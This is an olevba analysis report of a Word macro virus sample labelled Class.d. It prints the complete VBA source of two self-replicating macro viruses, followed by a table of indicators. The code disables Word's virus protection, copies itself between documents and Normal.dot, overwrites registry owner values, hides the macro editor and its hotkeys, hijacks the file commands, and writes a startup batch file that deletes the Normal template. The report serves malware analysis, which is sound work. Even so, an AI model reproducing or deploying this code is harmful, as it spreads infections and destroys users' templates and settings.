olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Const REG_SZ As Long = 1
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Const HKEY_CURRENT_USER As Long = &H80000001
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Sub AutoOpen()
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
On Error GoTo out
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Options.VirusProtection = False
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Options.SaveNormalPrompt = False
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Options.ConfirmConversions = False
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
If nt > 70 And ad > 0 Then GoTo out
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
If nt < 70 Then
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
End If
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
host.codemodule.AddFromFile ("c:\class.sys")
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
With host.codemodule
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    For x = 1 To 16
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    .deletelines 1
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    Next x
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
End With
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
If nt < 70 Then
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    With host.codemodule
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    .replaceline 1, "Sub AutoClose()"
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    .replaceline 91, "Sub ToolsMacro()"
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    For x = 70 To 81
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
        .deletelines 62
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    Next x
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    .replaceline 35, "    For x = 1 To 4"
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    End With
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
End If
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
If nt < 70 Then
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
u = RegCloseKey(k)
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
End If
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
With host.codemodule
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    For x = 2 To 104 Step 2
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
    Next x
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
End With
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
out:
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
End Sub
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
Sub ViewVBCode()
'MANILA, PHILS.6/28/99 8:40:30 AMCanon  BJC-210SP on LPT1:INDIVIDUAL DAILY PROGRAM- cover
End Sub
-------------------------------------------------------------------------------
VBA MACRO Armageddon.bas 
in file: Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929 - OLE stream: 'Macros/VBA/Armageddon'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Macros by Ringo T Rivera

Public Armageddon0
Public Armageddon1
Public Armageddon2
Public Armageddon3

Sub Armageddon4()
 Call Armageddon9
 Armageddon0 = Application.DisplayAlerts
 Application.DisplayAlerts = wdAlertsNone
 WordBasic.DisableAutoMacros 0
 CommandBars("Visual Basic").Visible = False
 CommandBars("Visual Basic").Enabled = False
 CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
 CommandBars("Visual Basic").Protection = msoBarNoCustomize
 On Error Resume Next
 CommandBars("Tools").Controls("Macro").Delete
 CustomizationContext = NormalTemplate
 FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
 FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
 On Error GoTo 0
End Sub

Sub Armageddon5()
 Application.DisplayAlerts = Armageddon0
End Sub

Sub Armageddon6()
 Call Armageddon9
 On Error GoTo Jump0
 Armageddon2 = False
 Set ad = ActiveDocument
 Set nt = NormalTemplate
 On Error GoTo Jump1
 For I = 1 To nt.VBProject.VBComponents.Count
  NMacr = nt.VBProject.VBComponents(I).Name
  If NMacr = "Armageddon" Then Armageddon2 = True
  If (NMacr <> "Armageddon") And (NMacr <> "ArmageddonForm") And (NMacr <> "ThisDocument") Then
   Application.OrganizerDelete Source:=nt.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
  End If
 Next I
Jump1:
 If Armageddon2 = False Then
  On Error GoTo Jump3
  Application.OrganizerCopy Source:=ad.FullName, Destination:=nt.FullName, Name:="Armageddon", Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=ad.FullName, Destination:=nt.FullName, Name:="ArmageddonForm", Object:=wdOrganizerObjectProjectItems
  nfat = GetAttr(NormalTemplate.FullName)
  If (nfat <> vbReadOnly) And (nfat <> vbReadOnly + vbArchive) Then
   Templates(nt.FullName).Save
  Else
   Call ArmageddonB
  End If
Jump3:
 End If
Jump0:
End Sub

Sub Armageddon7()
 On Error GoTo Jump00
 Armageddon1 = 0
 Armageddon3 = False
 Set ad = ActiveDocument
 Set nt = NormalTemplate
 On Error GoTo Jump01
 For I = 1 To ad.VBProject.VBComponents.Count
  NMacr = ad.VBProject.VBComponents(I).Name
  If NMacr = "Armageddon" Then Armageddon3 = True
  If NMacr = "ArmageddonForm" Then Armageddon3 = True
  If (NMacr <> "Armageddon") And (NMacr <> "ArmageddonForm") And (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
   Application.OrganizerDelete Source:=ad.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
  End If
 Next I
Jump01:
 If Armageddon3 = False Then
  On Error GoTo Jump03
  Application.OrganizerCopy Source:=nt.FullName, Destination:=ad.FullName, Name:="Armageddon", Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=nt.FullName, Destination:=ad.FullName, Name:="ArmageddonForm", Object:=wdOrganizerObjectProjectItems
  Armageddon1 = 1
Jump03:
 End If
Jump00:
End Sub

Sub Armageddon8()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon5
End Sub

Sub Armageddon9()
 Options.VirusProtection = False
 Options.SaveNormalPrompt = False
End Sub

Sub ArmageddonA()
 On Error GoTo Jump21
 Set ad = ActiveDocument
 If Armageddon1 = 1 Then
  ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
 End If
Jump21:
End Sub

Sub ArmageddonB()
 Dim hFile As Long
 On Error Resume Next
 Set nt = NormalTemplate
 Part1 = "@echo off"
 Part11 = "attrib -s -h -r +a "
 snag = "c:\progra~1\micros~1\templa~1\"
 snag1 = "c:\progra~1\micros~2\templa~1\"
 Part2 = "del "
 Part33 = "cls"
 hFile = FreeFile
 ArmageddonFile = "c:\windows\startm~1\programs\startup\win.bat"
 Open ArmageddonFile For Output Access Write As hFile
  Print #hFile, Part1
  Print #hFile, Part11 + snag + nt
  Print #hFile, Part11 + snag1 + nt
  Print #hFile, Part2 + snag + nt
  Print #hFile, Part2 + snag1 + nt
  Print #hFile, Part33
  Print #hFile, Part2 + ArmageddonFile
 Close hFile
End Sub

Sub AutoOpen()
 Call Armageddon8
End Sub

Sub FileClose()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 WordBasic.FileClose
End Sub

Sub FileOpen()
 Call Armageddon8
 Dialogs(wdDialogFileOpen).Show
 Call Armageddon4
 Call Armageddon7
 Call ArmageddonA
 Call Armageddon5
End Sub

Sub FileSaveAs()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub FileSave()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 On Error GoTo Jump31
 If ActiveDocument.Saved = False Then ActiveDocument.Save
Jump31:
End Sub

Sub FileExit()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 WordBasic.FileExit
End Sub

Sub HelpAbout()
 On Error GoTo Jump11
 ArmageddonForm.Show
Jump11:
End Sub

Sub ToolsOptions()
 Dialogs(wdDialogToolsOptions).Show
 Call Armageddon8
End Sub

Sub FileNew()
 Call Armageddon8
 Dialogs(wdDialogFileNew).Show
End Sub

Sub FileTemplates()
 Call Armageddon8
End Sub

Sub ToolsMacro()
 Call Armageddon8
End Sub

Sub ToolsCustomize()
 Call Armageddon8
End Sub

Sub ToolsCustomizeKeyboard()
 Call Armageddon8
End Sub

Sub ViewVBCode()
 Call Armageddon8
End Sub

Sub Organizer()
End Sub
 
-------------------------------------------------------------------------------
VBA MACRO ArmageddonForm.frm 
in file: Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929 - OLE stream: 'Macros/VBA/ArmageddonForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


























Private Sub CommandButton1_Click()
Unload Me
End Sub

Private Sub CommandButton1_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)

End Sub

Private Sub Label1_Click()

End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929' - OLE stream: 'Macros/ArmageddonForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"He traded sand for skins, skins for gold, gold for life.  In the end, he traded life for sand."�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929' - OLE stream: 'Macros/ArmageddonForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929' - OLE stream: 'Macros/ArmageddonForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929' - OLE stream: 'Macros/ArmageddonForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Class.d-e7e1c700a3882566c36342bd36a7ba8107892929' - OLE stream: 'Macros/ArmageddonForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |win.bat             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

